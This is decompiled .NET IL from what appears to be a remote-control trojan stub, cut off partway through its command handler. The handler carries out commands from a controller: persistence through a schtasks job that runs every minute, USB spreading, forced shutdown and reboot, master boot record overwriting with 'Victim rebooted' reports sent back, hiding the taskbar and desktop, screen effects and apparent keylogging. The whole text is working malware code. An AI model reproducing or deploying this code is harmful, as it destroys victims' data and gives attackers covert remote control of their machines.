  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("winmm.dll" winapi) 
          int32  mciSendString(string command,
                               string buffer,
                               int32 bufferSize,
                               native int hwndCallback) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  marshal( bool)  ReleaseDC(native int hWnd,
                                          native int hDC) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          native int  CreateSolidBrush(uint32 crColor) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  PatBlt(native int hdc,
                       int32 nXLeft,
                       int32 nYLeft,
                       int32 nWidth,
                       int32 nHeight,
                       valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("gdi32.dll" nomangle unicode lasterr stdcall) 
          object  BitBlt(native int hdcDest,
                         int32 nXDest,
                         int32 nYDest,
                         int32 nWidth,
                         int32 nHeight,
                         native int hdcSrc,
                         int32 nXSrc,
                         int32 nYSrc,
                         int32 dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  StretchBlt(native int hdcDest,
                           int32 nXOriginDest,
                           int32 nYOriginDest,
                           int32 nWidthDest,
                           int32 nHeightDest,
                           native int hdcSrc,
                           int32 nXOriginSrc,
                           int32 nYOriginSrc,
                           int32 nWidthSrc,
                           int32 nHeightSrc,
                           valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetDesktopWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetWindowDC(native int hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          native int  SelectObject(native int hdc,
                                   native int hgdiobj) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          bool  DeleteObject(native int objectHandle) cil managed preservesig
  {
  }
  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       6645 (0x19f5)
    .maxstack  11
    .locals init (string[] V_0,
             uint8[] V_1,
             string V_2,
             class [System]System.Net.WebClient V_3,
             string V_4,
             uint8[] V_5,
             class [System]System.Net.WebClient V_6,
             string V_7,
             uint32 V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             native int V_11,
             int32 V_12,
             int32 V_13,
             valuetype [System.Drawing]System.Drawing.Rectangle V_14,
             native int V_15,
             int32 V_16,
             int32 V_17,
             native int V_18,
             int32 V_19,
             int32 V_20,
             native int V_21,
             int32 V_22,
             int32 V_23,
             native int V_24,
             int32 V_25,
             int32 V_26,
             native int V_27,
             int32 V_28,
             int32 V_29,
             uint8[] V_30,
             valuetype [mscorlib]System.Guid V_31,
             int32 V_32,
             int32 V_33,
             native int V_34,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons V_35,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon V_36,
             string V_37,
             string V_38,
             string V_39,
             int32 V_40,
             class [mscorlib]System.Exception V_41,
             class [mscorlib]System.Exception V_42,
             class [mscorlib]System.Exception V_43,
             class [mscorlib]System.Exception V_44,
             uint8[] V_45,
             object V_46,
             class [mscorlib]System.IO.MemoryStream V_47,
             int32 V_48,
             uint8[] V_49,
             object V_50,
             int32 V_51,
             string V_52,
             valuetype [System.Drawing]System.Drawing.Rectangle V_53,
             class [System.Drawing]System.Drawing.Bitmap V_54,
             class [System.Drawing]System.Drawing.Graphics V_55,
             valuetype [System.Drawing]System.Drawing.Size V_56,
             class [System.Drawing]System.Drawing.Bitmap V_57,
             class [mscorlib]System.IO.MemoryStream V_58,
             class [mscorlib]System.IO.MemoryStream V_59,
             string V_60,
             class [mscorlib]System.Exception V_61,
             int32 V_62,
             class [mscorlib]System.Exception V_63,
             class [mscorlib]System.Exception V_64,
             class [mscorlib]System.Exception V_65,
             class [mscorlib]System.Exception V_66,
             object[] V_67,
             bool[] V_68,
             int32 V_69,
             int32 V_70,
             class [mscorlib]System.Exception V_71,
             class [mscorlib]System.Exception V_72,
             class [mscorlib]System.Exception V_73)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string j.OK::BS(uint8[]&)
    IL_0007:  ldsfld     string j.OK::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.2
      IL_0018:  ldloc.2
      IL_0019:  call       uint32 '<PrivateImplementationDetails>'::ComputeStringHash(string)
      IL_001e:  stloc.s    V_8
      IL_0020:  ldloc.s    V_8
      IL_0022:  ldc.i4     0x7a5d43c2
      IL_0027:  bgt.un     IL_0162

      IL_002c:  ldloc.s    V_8
      IL_002e:  ldc.i4     0x38276e70
      IL_0033:  bgt.un     IL_00c7

      IL_0038:  ldloc.s    V_8
      IL_003a:  ldc.i4     0x234f382e
      IL_003f:  bgt.un.s   IL_0084

      IL_0041:  ldloc.s    V_8
      IL_0043:  ldc.i4     0x17722b8c
      IL_0048:  bgt.un.s   IL_0067

      IL_004a:  ldloc.s    V_8
      IL_004c:  ldc.i4     0x10fe67e
      IL_0051:  beq        IL_04f0

      IL_0056:  ldloc.s    V_8
      IL_0058:  ldc.i4     0x17722b8c
      IL_005d:  beq        IL_0440

      IL_0062:  br         IL_0e38

      IL_0067:  ldloc.s    V_8
      IL_0069:  ldc.i4     0x1e743595
      IL_006e:  beq        IL_0322

      IL_0073:  ldloc.s    V_8
      IL_0075:  ldc.i4     0x234f382e
      IL_007a:  beq        IL_042a

      IL_007f:  br         IL_0e38

      IL_0084:  ldloc.s    V_8
      IL_0086:  ldc.i4     0x2fc941c2
      IL_008b:  bgt.un.s   IL_00aa

      IL_008d:  ldloc.s    V_8
      IL_008f:  ldc.i4     0x2b6ce2a9
      IL_0094:  beq        IL_03fe

      IL_0099:  ldloc.s    V_8
      IL_009b:  ldc.i4     0x2fc941c2
      IL_00a0:  beq        IL_0364

      IL_00a5:  br         IL_0e38

      IL_00aa:  ldloc.s    V_8
      IL_00ac:  ldc.i4     0x34dc6912
      IL_00b1:  beq        IL_051c

      IL_00b6:  ldloc.s    V_8
      IL_00b8:  ldc.i4     0x38276e70
      IL_00bd:  beq        IL_0482

      IL_00c2:  br         IL_0e38

      IL_00c7:  ldloc.s    V_8
      IL_00c9:  ldc.i4     0x3e514fbe
      IL_00ce:  bgt.un.s   IL_0113

      IL_00d0:  ldloc.s    V_8
      IL_00d2:  ldc.i4     0x385f8569
      IL_00d7:  bgt.un.s   IL_00f6

      IL_00d9:  ldloc.s    V_8
      IL_00db:  ldc.i4     0x384ef06a
      IL_00e0:  beq        IL_02b4

      IL_00e5:  ldloc.s    V_8
      IL_00e7:  ldc.i4     0x385f8569
      IL_00ec:  beq        IL_02ca

      IL_00f1:  br         IL_0e38

      IL_00f6:  ldloc.s    V_8
      IL_00f8:  ldc.i4     0x3b036886
      IL_00fd:  beq        IL_034e

      IL_0102:  ldloc.s    V_8
      IL_0104:  ldc.i4     0x3e514fbe
      IL_0109:  beq        IL_0532

      IL_010e:  br         IL_0e38

      IL_0113:  ldloc.s    V_8
      IL_0115:  ldc.i4     0x4531c525
      IL_011a:  bgt.un.s   IL_0139

      IL_011c:  ldloc.s    V_8
      IL_011e:  ldc.i4     0x433cfaf2
      IL_0123:  beq        IL_0574

      IL_0128:  ldloc.s    V_8
      IL_012a:  ldc.i4     0x4531c525
      IL_012f:  beq        IL_055e

      IL_0134:  br         IL_0e38

      IL_0139:  ldloc.s    V_8
      IL_013b:  ldc.i4     0x77651492
      IL_0140:  beq        IL_03bc

      IL_0145:  ldloc.s    V_8
      IL_0147:  ldc.i4     0x79fa82c1
      IL_014c:  beq        IL_037a

      IL_0151:  ldloc.s    V_8
      IL_0153:  ldc.i4     0x7a5d43c2
      IL_0158:  beq        IL_02f6

      IL_015d:  br         IL_0e38

      IL_0162:  ldloc.s    V_8
      IL_0164:  ldc.i4     0xd5a43d84
      IL_0169:  bgt.un     IL_0209

      IL_016e:  ldloc.s    V_8
      IL_0170:  ldc.i4     0xa8db785e
      IL_0175:  bgt.un.s   IL_01ba

      IL_0177:  ldloc.s    V_8
      IL_0179:  ldc.i4     0x9dd9ccb2
      IL_017e:  bgt.un.s   IL_019d

      IL_0180:  ldloc.s    V_8
      IL_0182:  ldc.i4     0x8a3461c8
      IL_0187:  beq        IL_0414

      IL_018c:  ldloc.s    V_8
      IL_018e:  ldc.i4     0x9dd9ccb2
      IL_0193:  beq        IL_02e0

      IL_0198:  br         IL_0e38

      IL_019d:  ldloc.s    V_8
      IL_019f:  ldc.i4     0x9f0a2c69
      IL_01a4:  beq        IL_0338

      IL_01a9:  ldloc.s    V_8
      IL_01ab:  ldc.i4     0xa8db785e
      IL_01b0:  beq        IL_04da

      IL_01b5:  br         IL_0e38

      IL_01ba:  ldloc.s    V_8
      IL_01bc:  ldc.i4     0xb94c4a37
      IL_01c1:  bgt.un.s   IL_01e0

      IL_01c3:  ldloc.s    V_8
      IL_01c5:  ldc.i4     0xaa5bd645
      IL_01ca:  beq        IL_0498

      IL_01cf:  ldloc.s    V_8
      IL_01d1:  ldc.i4     0xb94c4a37
      IL_01d6:  beq        IL_04c4

      IL_01db:  br         IL_0e38

      IL_01e0:  ldloc.s    V_8
      IL_01e2:  ldc.i4     0xbf6b5498
      IL_01e7:  beq        IL_03a6

      IL_01ec:  ldloc.s    V_8
      IL_01ee:  ldc.i4     0xd009b61f
      IL_01f3:  beq        IL_03e8

      IL_01f8:  ldloc.s    V_8
      IL_01fa:  ldc.i4     0xd5a43d84
      IL_01ff:  beq        IL_0456

      IL_0204:  br         IL_0e38

      IL_0209:  ldloc.s    V_8
      IL_020b:  ldc.i4     0xe981ed0f
      IL_0210:  bgt.un.s   IL_0252

      IL_0212:  ldloc.s    V_8
      IL_0214:  ldc.i4     0xdeb88809
      IL_0219:  bgt.un.s   IL_0238

      IL_021b:  ldloc.s    V_8
      IL_021d:  ldc.i4     0xd82ddf1e
      IL_0222:  beq        IL_0506

      IL_0227:  ldloc.s    V_8
      IL_0229:  ldc.i4     0xdeb88809
      IL_022e:  beq        IL_046c

      IL_0233:  br         IL_0e38

      IL_0238:  ldloc.s    V_8
      IL_023a:  ldc.i4     0xe09dd725
      IL_023f:  beq.s      IL_029e

      IL_0241:  ldloc.s    V_8
      IL_0243:  ldc.i4     0xe981ed0f
      IL_0248:  beq        IL_0548

      IL_024d:  br         IL_0e38

      IL_0252:  ldloc.s    V_8
      IL_0254:  ldc.i4     0xf38d9cf1
      IL_0259:  bgt.un.s   IL_0278

      IL_025b:  ldloc.s    V_8
      IL_025d:  ldc.i4     0xef3e349a
      IL_0262:  beq        IL_058a

      IL_0267:  ldloc.s    V_8
      IL_0269:  ldc.i4     0xf38d9cf1
      IL_026e:  beq        IL_04ae

      IL_0273:  br         IL_0e38

      IL_0278:  ldloc.s    V_8
      IL_027a:  ldc.i4     0xf8258d3b
      IL_027f:  beq        IL_03d2

      IL_0284:  ldloc.s    V_8
      IL_0286:  ldc.i4     0xf9206bde
      IL_028b:  beq.s      IL_030c

      IL_028d:  ldloc.s    V_8
      IL_028f:  ldc.i4     0xf967d5e7
      IL_0294:  beq        IL_0390

      IL_0299:  br         IL_0e38

      IL_029e:  ldloc.2
      IL_029f:  ldstr      "persis"
      IL_02a4:  ldc.i4.0
      IL_02a5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02aa:  brfalse    IL_05a0

      IL_02af:  br         IL_0e38

      IL_02b4:  ldloc.2
      IL_02b5:  ldstr      "schedtasks"
      IL_02ba:  ldc.i4.0
      IL_02bb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02c0:  brfalse    IL_05aa

      IL_02c5:  br         IL_0e38

      IL_02ca:  ldloc.2
      IL_02cb:  ldstr      "unschedtasks"
      IL_02d0:  ldc.i4.0
      IL_02d1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02d6:  brfalse    IL_05f9

      IL_02db:  br         IL_0e38

      IL_02e0:  ldloc.2
      IL_02e1:  ldstr      "spreadusbme"
      IL_02e6:  ldc.i4.0
      IL_02e7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02ec:  brfalse    IL_061f

      IL_02f1:  br         IL_0e38

      IL_02f6:  ldloc.2
      IL_02f7:  ldstr      "restartme"
      IL_02fc:  ldc.i4.0
      IL_02fd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0302:  brfalse    IL_0629

      IL_0307:  br         IL_0e38

      IL_030c:  ldloc.2
      IL_030d:  ldstr      "shutdowm"
      IL_0312:  ldc.i4.0
      IL_0313:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0318:  brfalse    IL_063c

      IL_031d:  br         IL_0e38

      IL_0322:  ldloc.2
      IL_0323:  ldstr      "FuckMBR"
      IL_0328:  ldc.i4.0
      IL_0329:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_032e:  brfalse    IL_064f

      IL_0333:  br         IL_0e38

      IL_0338:  ldloc.2
      IL_0339:  ldstr      "FuckMBRNR"
      IL_033e:  ldc.i4.0
      IL_033f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0344:  brfalse    IL_06de

      IL_0349:  br         IL_0e38

      IL_034e:  ldloc.2
      IL_034f:  ldstr      "Flip"
      IL_0354:  ldc.i4.0
      IL_0355:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_035a:  brfalse    IL_075b

      IL_035f:  br         IL_0e38

      IL_0364:  ldloc.2
      IL_0365:  ldstr      "mirror"
      IL_036a:  ldc.i4.0
      IL_036b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0370:  brfalse    IL_07b4

      IL_0375:  br         IL_0e38

      IL_037a:  ldloc.2
      IL_037b:  ldstr      "Invert"
      IL_0380:  ldc.i4.0
      IL_0381:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0386:  brfalse    IL_080d

      IL_038b:  br         IL_0e38

      IL_0390:  ldloc.2
      IL_0391:  ldstr      "Flashbang"
      IL_0396:  ldc.i4.0
      IL_0397:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_039c:  brfalse    IL_0863

      IL_03a1:  br         IL_0e38

      IL_03a6:  ldloc.2
      IL_03a7:  ldstr      "LightsOut"
      IL_03ac:  ldc.i4.0
      IL_03ad:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03b2:  brfalse    IL_08b9

      IL_03b7:  br         IL_0e38

      IL_03bc:  ldloc.2
      IL_03bd:  ldstr      "boing"
      IL_03c2:  ldc.i4.0
      IL_03c3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03c8:  brfalse    IL_090c

      IL_03cd:  br         IL_0e38

      IL_03d2:  ldloc.2
      IL_03d3:  ldstr      "lockon"
      IL_03d8:  ldc.i4.0
      IL_03d9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03de:  brfalse    IL_096a

      IL_03e3:  br         IL_0e38

      IL_03e8:  ldloc.2
      IL_03e9:  ldstr      "lockoff"
      IL_03ee:  ldc.i4.0
      IL_03ef:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03f4:  brfalse    IL_0a2f

      IL_03f9:  br         IL_0e38

      IL_03fe:  ldloc.2
      IL_03ff:  ldstr      "rainbow"
      IL_0404:  ldc.i4.0
      IL_0405:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_040a:  brfalse    IL_0a9c

      IL_040f:  br         IL_0e38

      IL_0414:  ldloc.2
      IL_0415:  ldstr      "newmouse"
      IL_041a:  ldc.i4.0
      IL_041b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0420:  brfalse    IL_0b0f

      IL_0425:  br         IL_0e38

      IL_042a:  ldloc.2
      IL_042b:  ldstr      "OpenCD"
      IL_0430:  ldc.i4.0
      IL_0431:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0436:  brfalse    IL_0b2a

      IL_043b:  br         IL_0e38

      IL_0440:  ldloc.2
      IL_0441:  ldstr      "CloseCD"
      IL_0446:  ldc.i4.0
      IL_0447:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_044c:  brfalse    IL_0b41

      IL_0451:  br         IL_0e38

      IL_0456:  ldloc.2
      IL_0457:  ldstr      "HideTask"
      IL_045c:  ldc.i4.0
      IL_045d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0462:  brfalse    IL_0b58

      IL_0467:  br         IL_0e38

      IL_046c:  ldloc.2
      IL_046d:  ldstr      "ShowTask"
      IL_0472:  ldc.i4.0
      IL_0473:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0478:  brfalse    IL_0b6f

      IL_047d:  br         IL_0e38

      IL_0482:  ldloc.2
      IL_0483:  ldstr      "HideDesk"
      IL_0488:  ldc.i4.0
      IL_0489:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_048e:  brfalse    IL_0b86

      IL_0493:  br         IL_0e38

      IL_0498:  ldloc.2
      IL_0499:  ldstr      "ShowDesk"
      IL_049e:  ldc.i4.0
      IL_049f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04a4:  brfalse    IL_0b9d

      IL_04a9:  br         IL_0e38

      IL_04ae:  ldloc.2
      IL_04af:  ldstr      "Error"
      IL_04b4:  ldc.i4.0
      IL_04b5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04ba:  brfalse    IL_0bb4

      IL_04bf:  br         IL_0e38

      IL_04c4:  ldloc.2
      IL_04c5:  ldstr      "Speech"
      IL_04ca:  ldc.i4.0
      IL_04cb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04d0:  brfalse    IL_0ca1

      IL_04d5:  br         IL_0e38

      IL_04da:  ldloc.2
      IL_04db:  ldstr      "fun"
      IL_04e0:  ldc.i4.0
      IL_04e1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04e6:  brfalse    IL_0ce4

      IL_04eb:  br         IL_0e38

      IL_04f0:  ldloc.2
      IL_04f1:  ldstr      "Piano"
      IL_04f6:  ldc.i4.0
      IL_04f7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04fc:  brfalse    IL_0cf4

      IL_0501:  br         IL_0e38

      IL_0506:  ldloc.2
      IL_0507:  ldstr      "sht"
      IL_050c:  ldc.i4.0
      IL_050d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0512:  brfalse    IL_0d1e

      IL_0517:  br         IL_0e38

      IL_051c:  ldloc.2
      IL_051d:  ldstr      "rst"
      IL_0522:  ldc.i4.0
      IL_0523:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0528:  brfalse    IL_0d33

      IL_052d:  br         IL_0e38

      IL_0532:  ldloc.2
      IL_0533:  ldstr      "lof"
      IL_0538:  ldc.i4.0
      IL_0539:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_053e:  brfalse    IL_0d48

      IL_0543:  br         IL_0e38

      IL_0548:  ldloc.2
      IL_0549:  ldstr      "botk"
      IL_054e:  ldc.i4.0
      IL_054f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0554:  brfalse    IL_0d5d

      IL_0559:  br         IL_0e38

      IL_055e:  ldloc.2
      IL_055f:  ldstr      "ll"
      IL_0564:  ldc.i4.0
      IL_0565:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_056a:  brfalse    IL_0d67

      IL_056f:  br         IL_0e38

      IL_0574:  ldloc.2
      IL_0575:  ldstr      "kl"
      IL_057a:  ldc.i4.0
      IL_057b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0580:  brfalse    IL_0d72

      IL_0585:  br         IL_0e38

      IL_058a:  ldloc.2
      IL_058b:  ldstr      "prof"
      IL_0590:  ldc.i4.0
      IL_0591:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0596:  brfalse    IL_0d9b

      IL_059b:  br         IL_0e38

      IL_05a0:  call       void Persistence::Startup()
      IL_05a5:  br         IL_0e38

      IL_05aa:  ldc.i4.5
      IL_05ab:  newarr     [mscorlib]System.String
      IL_05b0:  dup
      IL_05b1:  ldc.i4.0
      IL_05b2:  ldstr      "schtasks /create /sc minute /mo 1 /tn "
      IL_05b7:  stelem.ref
      IL_05b8:  dup
      IL_05b9:  ldc.i4.1
      IL_05ba:  ldsfld     string j.OK::SCHEDNAME
      IL_05bf:  stelem.ref
      IL_05c0:  dup
      IL_05c1:  ldc.i4.2
      IL_05c2:  ldstr      " /tr "
      IL_05c7:  stelem.ref
      IL_05c8:  dup
      IL_05c9:  ldc.i4.3
      IL_05ca:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_05cf:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_05d4:  stelem.ref
      IL_05d5:  dup
      IL_05d6:  ldc.i4.4
      IL_05d7:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_05dc:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_05e1:  stelem.ref
      IL_05e2:  call       string [mscorlib]System.String::Concat(string[])
      IL_05e7:  ldc.i4.0
      IL_05e8:  ldc.i4.1
      IL_05e9:  ldc.i4     0x1388
      IL_05ee:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_05f3:  pop
      IL_05f4:  br         IL_0e38

      IL_05f9:  ldstr      "schtasks /delete /tn "
      IL_05fe:  ldsfld     string j.OK::SCHEDNAME
      IL_0603:  ldstr      " /f"
      IL_0608:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_060d:  ldc.i4.0
      IL_060e:  ldc.i4.1
      IL_060f:  ldc.i4     0x1388
      IL_0614:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0619:  pop
      IL_061a:  br         IL_0e38

      IL_061f:  call       void spredusb::Start()
      IL_0624:  br         IL_0e38

      IL_0629:  ldstr      "shutdown -r -t 00 -f"
      IL_062e:  ldc.i4.0
      IL_062f:  ldc.i4.0
      IL_0630:  ldc.i4.m1
      IL_0631:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0636:  pop
      IL_0637:  br         IL_0e38

      IL_063c:  ldstr      "shutdown -s -t 00 -f"
      IL_0641:  ldc.i4.0
      IL_0642:  ldc.i4.0
      IL_0643:  ldc.i4.m1
      IL_0644:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0649:  pop
      IL_064a:  br         IL_0e38

      IL_064f:  nop
      .try
      {
        IL_0650:  ldstr      "C://test.txt"
        IL_0655:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_065a:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_065f:  ldstr      "MSG"
        IL_0664:  ldsfld     string j.OK::Y
        IL_0669:  ldstr      "MBR Overwritten, Victim rebooted."
        IL_066e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0673:  call       bool j.OK::Send(string)
        IL_0678:  pop
        IL_0679:  call       void Stub.MBRSlayer::Start()
        IL_067e:  ldstr      "cmd /c start shutdown /r /f /t 3"
        IL_0683:  ldc.i4.0
        IL_0684:  ldc.i4.1
        IL_0685:  ldc.i4     0x1388
        IL_068a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                   bool,
                                                                                                   int32)
        IL_068f:  pop
        IL_0690:  ldstr      "C://test.txt"
        IL_0695:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_069a:  leave      IL_0e38

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_069f:  dup
        IL_06a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_06a5:  stloc.s    V_9
        IL_06a7:  ldloc.s    V_9
        IL_06a9:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_06ae:  ldstr      "denied"
        IL_06b3:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_06b8:  brfalse.s  IL_06d4

        IL_06ba:  ldstr      "MSG"
        IL_06bf:  ldsfld     string j.OK::Y
        IL_06c4:  ldstr      "Can't overwrite MBR. (No admin)"
        IL_06c9:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_06ce:  call       bool j.OK::Send(string)
        IL_06d3:  pop
        IL_06d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_06d9:  leave      IL_0e38

      }  // end handler
      IL_06de:  nop
      .try
      {
        IL_06df:  ldstr      "C://test.txt"
        IL_06e4:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_06e9:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_06ee:  ldstr      "MSG"
        IL_06f3:  ldsfld     string j.OK::Y
        IL_06f8:  ldstr      "MBR Overwritten."
